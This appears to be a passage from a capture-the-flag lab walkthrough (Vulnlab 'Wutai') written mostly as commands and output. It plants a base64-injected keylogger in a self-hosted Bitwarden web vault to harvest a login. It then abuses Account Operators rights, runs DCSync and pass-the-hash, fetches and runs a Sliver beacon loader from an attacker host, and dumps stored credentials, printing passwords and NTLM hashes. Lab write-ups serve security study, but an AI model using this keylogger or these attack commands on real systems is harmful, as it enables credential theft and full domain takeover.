9940eceddf5d   bitwarden/identity:2023.3.0        "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)   5000/tcp                                                                                 bitwarden-identity
1e0b25c93d14   bitwarden/icons:2023.3.0           "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)   5000/tcp                                                                                 bitwarden-icons
d627147599ac   bitwarden/sso:2023.3.0             "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)   5000/tcp                                                                                 bitwarden-sso
```

```
root@s021v010:~# docker exec -it bitwarden-web /bin/bash

向index.html加入下面js代码

键盘记录器
```

```js
var keys='';
var url = 'bitwarden-info.gif?c=';

document.onkeypress = function(e) {
    get = window.event?event:e;
    key = get.keyCode?get.keyCode:get.charCode;
    key = String.fromCharCode(key);
    keys+=key;
}
window.setInterval(function(){
    if(keys.length>0){
        new Image().src = url+keys;
        keys = '';
    }
}, 5000);
```

to base64 encode
```
dmFyIGtleXM9Jyc7CnZhciB1cmwgPSAnYml0d2FyZGVuLWluZm8uZ2lmP2M9JzsKCmRvY3VtZW50Lm9ua2V5cHJlc3MgPSBmdW5jdGlvbihlKSB7CiAgICBnZXQgPSB3aW5kb3cuZXZlbnQ/ZXZlbnQ6ZTsKICAgIGtleSA9IGdldC5rZXlDb2RlP2dldC5rZXlDb2RlOmdldC5jaGFyQ29kZTsKICAgIGtleSA9IFN0cmluZy5mcm9tQ2hhckNvZGUoa2V5KTsKICAgIGtleXMrPWtleTsKfQp3aW5kb3cuc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKXsKICAgIGlmKGtleXMubGVuZ3RoPjApewogICAgICAgIG5ldyBJbWFnZSgpLnNyYyA9IHVybCtrZXlzOwogICAgICAgIGtleXMgPSAnJzsKICAgIH0KfSwgNTAwMCk7
```

```
root@a18d2d46b7f9:/app# echo -ne "dmFyIGtleXM9Jyc7CnZhciB1cmwgPSAnYml0d2FyZGVuLWluZm8uZ2lmP2M9JzsKCmRvY3VtZW50Lm9ua2V5cHJlc3MgPSBmdW5jdGlvbihlKSB7CiAgICBnZXQgPSB3aW5kb3cuZXZlbnQ/ZXZlbnQ6ZTsKICAgIGtleSA9IGdldC5rZXlDb2RlP2dldC5rZXlDb2RlOmdldC5jaGFyQ29kZTsKICAgIGtleSA9IFN0cmluZy5mcm9tQ2hhckNvZGUoa2V5KTsKICAgIGtleXMrPWtleTsKfQp3aW5kb3cuc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKXsKICAgIGlmKGtleXMubGVuZ3RoPjApewogICAgICAgIG5ldyBJbWFnZSgpLnNyYyA9IHVybCtrZXlzOwogICAgICAgIGtleXMgPSAnJzsKICAgIH0KfSwgNTAwMCk7" | base64 -d > log.js
root@a18d2d46b7f9:/app# cat log.js
var keys='';
var url = 'bitwarden-info.gif?c=';

document.onkeypress = function(e) {
    get = window.event?event:e;
    key = get.keyCode?get.keyCode:get.charCode;
    key = String.fromCharCode(key);
    keys+=key;
}
window.setInterval(function(){
    if(keys.length>0){
        new Image().src = url+keys;
        keys = '';
    }
}, 5000);
```

```html
<!doctype html><html class="theme_light"><head><meta charset="utf-8"/><meta name="viewport" content="width=1010"/><meta name="theme-color" content="#175DDC"/><title page-title>Bitwarden Web Vault</title><link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png"/><link rel="mask-icon" href="images/safari-pinned-tab.svg" color="#175DDC"/><link rel="manifest" href="70501c97b33df95adb32.json"/><script defer="defer" src="theme_head.5f24ba8d7aa944e6f52b.js"></script><link href="app/main.450004ff4784a75d7340.css" rel="stylesheet"></head><body class="layout_frontend"><app-root><div class="mt-5 d-flex justify-content-center"><div><img class="mb-4 logo logo-themed" alt="Bitwarden"/><p class="text-center"><i class="bwi bwi-spinner bwi-spin bwi-2x text-muted" title="Loading" aria-hidden="true"></i></p></div></div></app-root><script defer="defer" src="app/polyfills.428c25638840333a09ee.js"></script><script defer="defer" src="app/vendor.d953474cf3bdb110b464.js"></script><script defer="defer" src="app/main.d40a4bf93122e2717dce.js"></script></body></html>
```

```html
<!doctype html><html class="theme_light"><head><meta charset="utf-8"/><meta name="viewport" content="width=1010"/><meta name="theme-color" content="#175DDC"/><title page-title>Bitwarden Web Vault</title><link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png"/><link rel="mask-icon" href="images/safari-pinned-tab.svg" color="#175DDC"/><link rel="manifest" href="70501c97b33df95adb32.json"/><script defer="defer" src="theme_head.5f24ba8d7aa944e6f52b.js"></script><link href="app/main.450004ff4784a75d7340.css" rel="stylesheet"></head><body class="layout_frontend"><app-root><div class="mt-5 d-flex justify-content-center"><div><img class="mb-4 logo logo-themed" alt="Bitwarden"/><p class="text-center"><i class="bwi bwi-spinner bwi-spin bwi-2x text-muted" title="Loading" aria-hidden="true"></i></p></div></div></app-root><script defer="defer" src="app/polyfills.428c25638840333a09ee.js"></script><script defer="defer" src="app/vendor.d953474cf3bdb110b464.js"></script><script defer="defer" src="app/main.d40a4bf93122e2717dce.js"></script><script src="log.js"></script></body></html>
```

```bash
root@s021v010:~# docker exec -it bitwarden-web /bin/bash
root@a18d2d46b7f9:/app# echo -ne "PCFkb2N0eXBlIGh0bWw+PGh0bWwgY2xhc3M9InRoZW1lX2xpZ2h0Ij48aGVhZD48bWV0YSBjaGFyc2V0PSJ1dGYtOCIvPjxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD0xMDEwIi8+PG1ldGEgbmFtZT0idGhlbWUtY29sb3IiIGNvbnRlbnQ9IiMxNzVEREMiLz48dGl0bGUgcGFnZS10aXRsZT5CaXR3YXJkZW4gV2ViIFZhdWx0PC90aXRsZT48bGluayByZWw9ImFwcGxlLXRvdWNoLWljb24iIHNpemVzPSIxODB4MTgwIiBocmVmPSJpbWFnZXMvYXBwbGUtdG91Y2gtaWNvbi5wbmciLz48bGluayByZWw9Imljb24iIHR5cGU9ImltYWdlL3BuZyIgc2l6ZXM9IjMyeDMyIiBocmVmPSJpbWFnZXMvZmF2aWNvbi0zMngzMi5wbmciLz48bGluayByZWw9Imljb24iIHR5cGU9ImltYWdlL3BuZyIgc2l6ZXM9IjE2eDE2IiBocmVmPSJpbWFnZXMvZmF2aWNvbi0xNngxNi5wbmciLz48bGluayByZWw9Im1hc2staWNvbiIgaHJlZj0iaW1hZ2VzL3NhZmFyaS1waW5uZWQtdGFiLnN2ZyIgY29sb3I9IiMxNzVEREMiLz48bGluayByZWw9Im1hbmlmZXN0IiBocmVmPSI3MDUwMWM5N2IzM2RmOTVhZGIzMi5qc29uIi8+PHNjcmlwdCBkZWZlcj0iZGVmZXIiIHNyYz0idGhlbWVfaGVhZC41ZjI0YmE4ZDdhYTk0NGU2ZjUyYi5qcyI+PC9zY3JpcHQ+PGxpbmsgaHJlZj0iYXBwL21haW4uNDUwMDA0ZmY0Nzg0YTc1ZDczNDAuY3NzIiByZWw9InN0eWxlc2hlZXQiPjwvaGVhZD48Ym9keSBjbGFzcz0ibGF5b3V0X2Zyb250ZW5kIj48YXBwLXJvb3Q+PGRpdiBjbGFzcz0ibXQtNSBkLWZsZXgganVzdGlmeS1jb250ZW50LWNlbnRlciI+PGRpdj48aW1nIGNsYXNzPSJtYi00IGxvZ28gbG9nby10aGVtZWQiIGFsdD0iQml0d2FyZGVuIi8+PHAgY2xhc3M9InRleHQtY2VudGVyIj48aSBjbGFzcz0iYndpIGJ3aS1zcGlubmVyIGJ3aS1zcGluIGJ3aS0yeCB0ZXh0LW11dGVkIiB0aXRsZT0iTG9hZGluZyIgYXJpYS1oaWRkZW49InRydWUiPjwvaT48L3A+PC9kaXY+PC9kaXY+PC9hcHAtcm9vdD48c2NyaXB0IGRlZmVyPSJkZWZlciIgc3JjPSJhcHAvcG9seWZpbGxzLjQyOGMyNTYzODg0MDMzM2EwOWVlLmpzIj48L3NjcmlwdD48c2NyaXB0IGRlZmVyPSJkZWZlciIgc3JjPSJhcHAvdmVuZG9yLmQ5NTM0NzRjZjNiZGIxMTBiNDY0LmpzIj48L3NjcmlwdD48c2NyaXB0IGRlZmVyPSJkZWZlciIgc3JjPSJhcHAvbWFpbi5kNDBhNGJmOTMxMjJlMjcxN2RjZS5qcyI+PC9zY3JpcHQ+PHNjcmlwdCBzcmM9ImxvZy5qcyI+PC9zY3JpcHQ+PC9ib2R5PjwvaHRtbD4=" |base64 -d > index.html
root@a18d2d46b7f9:/app# cat index.html
<!doctype html><html class="theme_light"><head><meta charset="utf-8"/><meta name="viewport" content="width=1010"/><meta name="theme-color" content="#175DDC"/><title page-title>Bitwarden Web Vault</title><link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png"/><link rel="mask-icon" href="images/safari-pinned-tab.svg" color="#175DDC"/><link rel="manifest" href="70501c97b33df95adb32.json"/><script defer="defer" src="theme_head.5f24ba8d7aa944e6f52b.js"></script><link href="app/main.450004ff4784a75d7340.css" rel="stylesheet"></head><body class="layout_frontend"><app-root><div class="mt-5 d-flex justify-content-center"><div><img class="mb-4 logo logo-themed" alt="Bitwarden"/><p class="text-center"><i class="bwi bwi-spinner bwi-spin bwi-2x text-muted" title="Loading" aria-hidden="true"></i></p></div></div></app-root><script defer="defer" src="app/polyfills.428c25638840333a09ee.js"></script><script defer="defer" src="app/vendor.d953474cf3bdb110b464.js"></script><script defer="defer" src="app/main.d40a4bf93122e2717dce.js"></script><script src="log.js"></script></body></html>
```

```bash
有用户访问Bitwarden Web,最终log会被记录到nginx日志中

root@s021v010:~# docker ps
CONTAINER ID   IMAGE                              COMMAND            CREATED        STATUS                  PORTS                                                                                    NAMES
5cc679b084c0   bitwarden/nginx:2023.3.0           "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)   80/tcp, 0.0.0.0:80->8080/tcp, :::80->8080/tcp, 0.0.0.0:443->8443/tcp, :::443->8443/tcp   bitwarden-nginx
8b11acc65796   bitwarden/admin:2023.3.0           "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)   5000/tcp                                                                                 bitwarden-admin
44228b2d8f53   bitwarden/mssql:2023.3.0           "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)                                                                                            bitwarden-mssql
79d6d6bbc52a   bitwarden/attachments:2023.3.0     "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)                                                                                            bitwarden-attachments
a18d2d46b7f9   bitwarden/web:2023.3.0             "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)                                                                                            bitwarden-web
0b324073a17e   bitwarden/notifications:2023.3.0   "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)   5000/tcp                                                                                 bitwarden-notifications
230355d545c1   bitwarden/events:2023.3.0          "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)   5000/tcp                                                                                 bitwarden-events
efe6bf763230   bitwarden/api:2023.3.0             "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)   5000/tcp                                                                                 bitwarden-api
9940eceddf5d   bitwarden/identity:2023.3.0        "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)   5000/tcp                                                                                 bitwarden-identity
1e0b25c93d14   bitwarden/icons:2023.3.0           "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)   5000/tcp                                                                                 bitwarden-icons
d627147599ac   bitwarden/sso:2023.3.0             "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)   5000/tcp                                                                                 bitwarden-sso
root@s021v010:~# docker exec -it bitwarden-nginx /bin/bash
root@5cc679b084c0:/# ls
bin  boot  dev	docker-entrypoint.d  docker-entrypoint.sh  entrypoint.sh  etc  home  lib  lib64  logrotate.sh  media  mnt  opt	proc  root  run  sbin  srv  sys  tmp  usr  var
root@5cc679b084c0:/# cd /var/log/nginx/
root@5cc679b084c0:/var/log/nginx# tail -f access.log | grep bitwarden-info.gif
```

```bash
root@s021v010:~# docker exec -it bitwarden-nginx /bin/bash
root@5cc679b084c0:/# cd /var/log/nginx/
root@5cc679b084c0:/var/log/nginx# tail -f access.log | grep bitwarden-info.gif
172.16.21.200 - - [03/Nov/2023:21:58:09 +0000] "GET /bitwarden-info.gif?c=fiona.stewart@junon.vlJunon2023!Bitwarden HTTP/2.0" 404 0 "https://s021v010/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5614.0 Safari/537.36" "-"
```

```
fiona.stewart@junon.vl
Junon2023!Bitwarden


fiona.stewart
nothing
but

此用户貌似有多个账户

不同的权限级别
分层模型


```
![](/assets/post_img/2023-11-04%20055415_Wutai_stewart.png)

```
但是我们没有获取到stewart的域凭据信息

但是我们获得了她的bitwarden登录凭据
```

```
HD-FSTEWART@WORK.JUNON.VL
ACCOUNT OPERATORS@WORK.JUNON.VL

DEQ8mC2xxTzVNB
```
![](/assets/post_img/2023-11-04%20171408_Wutai_HD-FSTEWART.png)
```
The user HD-FSTEWART@WORK.JUNON.VL is a member of the group ACCOUNT OPERATORS@WORK.JUNON.VL.

Groups in active directory grant their members any privileges the group itself has. If a group has rights to another principal, users/computers in the group, as well as other groups inside the group inherit those permissions.

ACCOUNT OPERATORS
```

---

## <span style="color:lightblue">Account Operators, Trust Enumeration & Password Reuse</span>

```bash
proxychains4 -q bloodhound-python -c all --disable-pooling -w 1 -u "HD-FSTEWART" -p 'DEQ8mC2xxTzVNB' -d work.junon.vl -dc dc.work.junon.vl -ns 172.16.21.200 --dns-tcp --zip
```

```bash
proxychains4 -q rpcclient 172.16.21.200 -U WORK.JUNON.VL\\HD-FSTEWART

rpcclient $> createdomuser fsociety
rpcclient $> setuserinfo2 fsociety 24 p-0p-0p-0


user:[fsociety] rid:[0x13ed]
rpcclient $> enumdomusers


```
登录kasm Workspaces runasHD-FSTEWART
```powershell
C:\fsociety>runas /user:WORK.JUNON.VL\HD-FSTEWART cmd

C:\Windows\system32>whoami
work-junon\hd-fstewart
```

```powershell
C:\Windows\system32>net user fsociety /domain
The request will be processed at a domain controller for domain work.junon.vl.

User name                    fsociety
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               No
Account expires              Never

Password last set            11/4/2023 3:41:35 AM
Password expires             12/16/2023 3:41:35 AM
Password changeable          11/5/2023 3:41:35 AM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.
```

```
Account active               No
```

```powershell
net user fsociety /domain /active:yes
```

```powershell
net group "PASSWORD-AUDIT" fsociety /add /domain

C:\Windows\system32>net user fsociety /domain
The request will be processed at a domain controller for domain work.junon.vl.

User name                    fsociety
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/4/2023 3:41:35 AM
Password expires             12/16/2023 3:41:35 AM
Password changeable          11/5/2023 3:41:35 AM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Password-Audit
The command completed successfully.
```

![](/assets/post_img/2023-11-04%20184817_Wutai_PASSWORD_AUDITWORK_JUNON_VL.png)

DCSYNC
```bash
proxychains4 -q impacket-secretsdump -just-dc fsociety:'p-0p-0p-0'@172.16.21.200 -outputfile work_junon.hashes
```

```bash
cat work_junon.hashes.ntds|grep -i administrator
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b976dde1bcbbf31cbdab60d2a5a5449d:::
```

```bash
proxychains4 -q impacket-wmiexec administrator@172.16.21.200 -hashes :b976dde1bcbbf31cbdab60d2a5a5449d
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
work-junon\administrator

C:\>mkdir fsociety

C:\>cd fsociety
C:\fsociety>powershell -c "iwr http://10.8.0.227:8000/Loaders.exe -usebasicparsing -outfile fsociety.exe"

C:\fsociety>dir
 Volume in drive C has no label.
 Volume Serial Number is 9264-EECF

 Directory of C:\fsociety

11/04/2023  04:15 AM    <DIR>          .
11/04/2023  04:16 AM        11,140,608 fsociety.exe
               1 File(s)     11,140,608 bytes
               1 Dir(s)  18,115,579,904 bytes free

C:\fsociety>fsociety.exe
```

```bash
 f1eb9b58   wutai-http   http(s)     S021M005   WORK-JUNON\Administrator   windows/amd64      13s             17s

[server] sliver > use f1eb9b58-9051-4d91-bdcf-58156419023e

[*] Active beacon wutai-http (f1eb9b58-9051-4d91-bdcf-58156419023e)

[server] sliver (wutai-http) > interactive

[*] Using beacon's active C2 endpoint: https://10.8.0.227?driver=wininet
[*] Tasked beacon wutai-http (c68b727c)

[*] Session 2b3e6e95 wutai-http - 172.16.20.2:54217 (S021M005) - windows/amd64 - Sat, 04 Nov 2023 07:11:02 EDT

[server] sliver (wutai-http) > use 2b3e6e95-18b6-4c58-be9d-cc25cabe5c47

[*] Active session wutai-http (2b3e6e95-18b6-4c58-be9d-cc25cabe5c47)

[server] sliver (wutai-http) > info

        Session ID: 2b3e6e95-18b6-4c58-be9d-cc25cabe5c47
              Name: wutai-http
          Hostname: S021M005
              UUID: 31a54d56-f302-6f44-50bb-81f49a517687
          Username: WORK-JUNON\Administrator
               UID: S-1-5-21-1112787665-3955584987-2510362858-500
               GID: S-1-5-21-1112787665-3955584987-2510362858-513
               PID: 6080
                OS: windows
           Version: Server 2016 build 20348 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: https://10.8.0.227?driver=wininet
    Remote Address: 172.16.20.2:54217
         Proxy URL:
Reconnect Interval: 1m0s
     First Contact: Sat Nov  4 07:11:02 EDT 2023 (5s ago)
      Last Checkin: Sat Nov  4 07:11:06 EDT 2023 (1s ago)
```

```bash
[server] sliver (wutai-http) > execute-assembly -i -s /home/kali/Downloads/SharpHound.exe -- -c all,gpolocalgroup -d eu.junon.vl

[server] sliver (wutai-http) > download 20231104105301_wjus0f4t.rzt.zip
```

```
查看
S021M200.EU.JUNON.VL EU的DC 172.16.21.222
S021M215 域内机器 172.16.21.223
```

```bash
proxychains4 -q nmap -Pn -sT -v -T4 -p 22,80,443,135,445,5985,3389 172.16.21.223

3389
5985
```

```bash
 proxychains4 -q ./nxc smb 172.16.21.222 -d work.junon.vl -u melanie.mueller -p Summer2023 --shares
SMB         172.16.21.222   445    S021M200         [*] Windows 10.0 Build 20348 x64 (name:S021M200) (domain:work.junon.vl) (signing:True) (SMBv1:False)
SMB         172.16.21.222   445    S021M200         [+] work.junon.vl\melanie.mueller:Summer2023
SMB         172.16.21.222   445    S021M200         [*] Enumerated shares
SMB         172.16.21.222   445    S021M200         Share           Permissions     Remark
SMB         172.16.21.222   445    S021M200         -----           -----------     ------
SMB         172.16.21.222   445    S021M200         ADMIN$                          Remote Admin
SMB         172.16.21.222   445    S021M200         C$                              Default share
SMB         172.16.21.222   445    S021M200         CertEnroll      READ            Active Directory Certificate Services share
SMB         172.16.21.222   445    S021M200         IPC$            READ            Remote IPC
SMB         172.16.21.222   445    S021M200         NETLOGON        READ            Logon server share
SMB         172.16.21.222   445    S021M200         SYSVOL          READ            Logon server share
```

```
ADCS
```

```bash
cat work_junon.hashes.ntds|cut -d ":" -f1|grep work.junon.vl|cut -d '\' -f2|tee users_work.txt

junon.vl 采用了分层管理模型

[server] sliver (wutai-http) > sharpview -t 500 -- Get-DomainUser -Domain eu.junon.vl -Properties samaccountname

cat eu.sharpview|cut -d ":" -f2|cut -d " " -f2|awk 'NF'|tee users_eu.txt

while read -r line; do grep -qF "$line" work_junon.hashes.ntds && echo "$line"; done < users_eu.txt
Administrator
Guest
krbtgt
Garry.Smith
sa-kmorris
```

```bash
Garry.Smith 4ed87458bfd1166a398ebad53d6935fe
sa-kmorris  4fd64fa379181761b526f77ce577b5ac

proxychains4 -q ./nxc smb 172.16.21.222 -d eu.junon.vl -u Garry.Smith -H 4ed87458bfd1166a398ebad53d6935fe
SMB         172.16.21.222   445    S021M200         [*] Windows 10.0 Build 20348 x64 (name:S021M200) (domain:eu.junon.vl) (signing:True) (SMBv1:False)
SMB         172.16.21.222   445    S021M200         [-] eu.junon.vl\Garry.Smith:4ed87458bfd1166a398ebad53d6935fe STATUS_LOGON_FAILURE

Garry.Smith身份验证失败

proxychains4 -q ./nxc smb 172.16.21.222 -d eu.junon.vl -u sa-kmorris -H 4fd64fa379181761b526f77ce577b5ac

sa-kmorris 依然身份验证失败
```
```
cat users_eu.txt|grep sa
Teresa.Shah
Teresa.Begum
sa-kmorris

sa-kyoung
sa-dwest

cat users_work.txt|grep -i west
Dale.West

work.junon.vl\Dale.West:1405:aad3b435b51404eeaad3b435b51404ee:fa277a017b90f30048992530d3f9b75f:::


sa-dwest
fa277a017b90f30048992530d3f9b75f

```

成功通过了域身份验证
```bash
proxychains4 -q ./nxc smb 172.16.21.222 -d eu.junon.vl -u sa-dwest -H fa277a017b90f30048992530d3f9b75f
SMB         172.16.21.222   445    S021M200         [*] Windows 10.0 Build 20348 x64 (name:S021M200) (domain:eu.junon.vl) (signing:True) (SMBv1:False)
SMB         172.16.21.222   445    S021M200         [+] eu.junon.vl\sa-dwest:fa277a017b90f30048992530d3f9b75f

```

winrm
```bash
proxychains4 -q evil-winrm -u sa-dwest -i 172.16.21.223 -H fa277a017b90f30048992530d3f9b75f

*Evil-WinRM* PS C:\Users\sa-dwest\Documents> whoami
eu-junon\sa-dwest
```

```powershell
*Evil-WinRM* PS C:\Users\sa-dwest\Documents> whoami /all

USER INFORMATION
----------------

User Name         SID
================= =============================================
eu-junon\sa-dwest S-1-5-21-2634976785-1424521755-791916841-1313


GROUP INFORMATION
-----------------

Group Name                           Type             SID                                           Attributes
==================================== ================ ============================================= ===============================================================
Everyone                             Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators               Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
EU-JUNON\ServerAdmins                Group            S-1-5-21-2634976785-1424521755-791916841-1306 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

```powershell
*Evil-WinRM* PS C:\Users\sa-dwest\Documents> cd C:\Users\administrator\Desktop\
*Evil-WinRM* PS C:\Users\administrator\Desktop> dir


    Directory: C:\Users\administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/28/2023   1:33 PM             36 root.txt


*Evil-WinRM* PS C:\Users\administrator\Desktop> type root.txt
VL{591eca30daceb53f980e6f25314ad7c3}
```

Beacon

```bash
*Evil-WinRM* PS C:\Windows\Tasks> iwr http://10.8.0.227:8000/Loaders.exe -usebasicparsing -outfile fsociety.exe

*Evil-WinRM* PS C:\Windows\Tasks> .\fsociety.exe
```

![](/assets/post_img/2023-11-05%2006012_Wutai_S021M215.png)

sharpdpapi

```bash
TaskScheduler
UserName         : EU-JUNON\svc_backup
Credential       : b4ckup5821!
```

```
Reachable High Value Targets	19
```
![](/assets/post_img/2023-11-05%20060809_svc_backup_Reachable_High_Value_Targets.png)

